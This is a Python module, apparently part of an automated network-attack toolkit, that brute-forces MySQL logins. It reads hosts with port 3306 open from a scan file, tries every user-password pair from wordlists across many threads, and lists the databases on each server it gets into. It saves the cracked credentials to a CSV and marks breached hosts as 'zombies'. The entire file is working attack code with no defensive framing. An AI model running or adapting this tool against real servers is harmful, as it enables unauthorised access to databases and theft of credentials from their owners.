import os
import csv
import pymysql
import threading
import logging
import time
from queue import Queue, Empty
from shared import SharedData
from logger import Logger
from timeout_utils import (
    join_threads_with_timeout,
    drain_queue_safely
)

# Configure the logger
logger = Logger(name="sql_bruteforce.py", level=logging.INFO)

# Define the necessary global variables
b_class = "SQLBruteforce"
b_module = "sql_connector"
b_status = "brute_force_sql"
b_port = 3306
b_parent = None


class SQLBruteforce:
    """
    Class to handle the SQL brute force process.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.sql_connector = SQLConnector(shared_data)
        logger.info("SQLConnector initialized.")

    def bruteforce_sql(self, ip, port, mac_address='', hostname=''):
        """
        Run the SQL brute force attack on the given IP and port.
        """
        return self.sql_connector.run_bruteforce(ip, port, mac_address, hostname)

    def execute(self, ip, port, row, status_key):
        """
        Execute the brute force attack and update status.
        """
        start_time = time.time()
        logger.lifecycle_start("SQLBruteforce", ip, port)
        self.shared_data.bjornorch_status = "SQLBruteforce"
        # Extract hostname and MAC from the row passed by orchestrator
        hostname = row.get('Hostnames', '')
        mac_address = row.get('MAC Address', '')
        try:
            success, results = self.bruteforce_sql(ip, port, mac_address, hostname)
            status = 'success' if success else 'no_creds_found'
        except Exception as e:
            logger.error(f"SQL bruteforce error for {ip}: {e}")
            status = 'error'
        finally:
            duration = time.time() - start_time
            logger.lifecycle_end("SQLBruteforce", status, duration, ip)
        return status

class SQLConnector:
    """
    Class to manage the connection attempts and store the results.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.load_scan_file()
        self.users = open(shared_data.usersfile, "r").read().splitlines()
        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()

        self.lock = threading.Lock()
        self.sqlfile = shared_data.sqlfile
        if not os.path.exists(self.sqlfile):
            with open(self.sqlfile, "w") as f:
                f.write("MAC Address,IP Address,Hostname,User,Password,Port,Database\n")
        self.results = []
        self.queue = Queue()
        self.progress_lock = threading.Lock()
        self.progress_count = 0
        self.progress_total = 0

    def _load_csv_filtered(self, filepath, port_filter):
        """Load CSV and filter rows containing the specified port."""
        rows = []
        if os.path.exists(filepath):
            with open(filepath, 'r', newline='') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    ports = row.get("Ports", "")
                    if ports and port_filter in ports:
                        rows.append(row)
        return rows

    def load_scan_file(self):
        """
        Load the scan file and filter it for SQL ports.
        """
        self.scan = self._load_csv_filtered(self.shared_data.netkbfile, "3306")

    def sql_connect(self, adresse_ip, user, password):
        """
        Attempt to connect to an SQL service using the given credentials without specifying a database.
        Uses 30 second connect and read timeouts.
        """
        try:
            # First attempt without specifying a database
            conn = pymysql.connect(
                host=adresse_ip,
                user=user,
                password=password,
                port=3306,
                connect_timeout=30,
                read_timeout=30,
                write_timeout=30
            )

            # If connection succeeds, retrieve the list of databases
            with conn.cursor() as cursor:
                cursor.execute("SHOW DATABASES")
                databases = [db[0] for db in cursor.fetchall()]

            conn.close()
            logger.info(f"Successfully connected to {adresse_ip} with user {user}")
            logger.info(f"Available databases: {', '.join(databases)}")

            # Save information with the list of found databases
            return True, databases

        except pymysql.Error as e:
            # Access denied is expected during brute force - log at DEBUG level
            logger.debug(f"Failed to connect to {adresse_ip} with user {user}: {e}")
            return False, []


    def worker(self, success_flag):
        """
        Worker thread to process items in the queue.
        Uses graceful shutdown pattern with timeout on queue.get().
        """
        while True:
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping worker thread.")
                break
            try:
                item = self.queue.get(timeout=1.0)
            except Empty:
                if self.queue.empty():
                    break
                continue

            adresse_ip, user, password, mac_address, hostname, port = item
            try:
                success, databases = self.sql_connect(adresse_ip, user, password)

                if success:
                    with self.lock:
                        # Add an entry for each database found
                        for db in databases:
                            self.results.append([mac_address, adresse_ip, hostname, user, password, port, db])

                        logger.success(f"Found credentials for IP: {adresse_ip} | User: {user} | Password: {password}")
                        logger.success(f"Databases found: {', '.join(databases)}")
                        success_flag[0] = True
                    # File I/O outside lock
                    self.save_results()
                    self.remove_duplicates()
                    self.shared_data.record_zombie(mac_address, adresse_ip)
            finally:
                self.queue.task_done()
                with self.progress_lock:
                    self.progress_count += 1
                    if self.progress_count % 50 == 0:
                        logger.info(f"Bruteforcing SQL... {self.progress_count}/{self.progress_total}")

    def run_bruteforce(self, adresse_ip, port, mac_address='', hostname=''):
        # mac_address and hostname passed from orchestrator for consistency
        self.mac_address = mac_address
        self.hostname = hostname

        total_tasks = len(self.users) * len(self.passwords)
        self.progress_total = total_tasks
        self.progress_count = 0

        for user in self.users:
            for password in self.passwords:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
                    return False, []
                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))

        success_flag = [False]
        threads = []

        logger.info(f"Bruteforcing SQL on {adresse_ip}... (0/{total_tasks})")

        for _ in range(self.shared_data.worker_threads):  # Configurable via shared_config.json
            t = threading.Thread(target=self.worker, args=(success_flag,))
            t.start()
            threads.append(t)

        # Wait for queue with exit signal checking
        queue_timeout = self.shared_data.bruteforce_queue_timeout
        queue_start = time.time()
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping bruteforce.")
                drain_queue_safely(self.queue)
                break
            if time.time() - queue_start > queue_timeout:
                logger.lifecycle_timeout("SQLBruteforce", "queue processing", queue_timeout, adresse_ip)
                drain_queue_safely(self.queue)
                break
            time.sleep(0.5)

        # Give workers time to finish current items
        time.sleep(2)

        # Join threads with timeout
        hanging = join_threads_with_timeout(threads, timeout=10, logger=logger)
        if hanging:
            logger.warning(f"SQL bruteforce: {len(hanging)} threads did not terminate cleanly")

        logger.info(f"Bruteforcing complete with success status: {success_flag[0]}")
        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful

    def save_results(self):
        """
        Save the results of successful connection attempts to a CSV file.
        """
        with open(self.sqlfile, 'a', newline='') as f:
            writer = csv.writer(f)
            for row in self.results:
                writer.writerow(row)
        logger.debug(f"Saved SQL credentials")
        self.results = []

    def remove_duplicates(self):
        """
        Remove duplicate entries from the results CSV file.
        """
        rows = []
        header = None
        if os.path.exists(self.sqlfile):
            with open(self.sqlfile, 'r', newline='') as f:
                reader = csv.reader(f)
                header = next(reader, None)
                seen = set()
                for row in reader:
                    key = tuple(row)
                    if key not in seen:
                        seen.add(key)
                        rows.append(row)

        with open(self.sqlfile, 'w', newline='') as f:
            writer = csv.writer(f)
            if header:
                writer.writerow(header)
            writer.writerows(rows)

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        sql_bruteforce = SQLBruteforce(shared_data)
        logger.info("Starting SQL brute force attack on port 3306...")

        # Load the IPs to scan from shared data
        ips_to_scan = shared_data.read_data()

        # Execute brute force attack on each IP
        for row in ips_to_scan:
            ip = row["IPs"]
            sql_bruteforce.execute(ip, b_port, row, b_status)

        logger.info(f"Total successful attempts: {len(sql_bruteforce.sql_connector.results)}")
        exit(len(sql_bruteforce.sql_connector.results))
    except Exception as e:
        logger.error(f"Error: {e}")
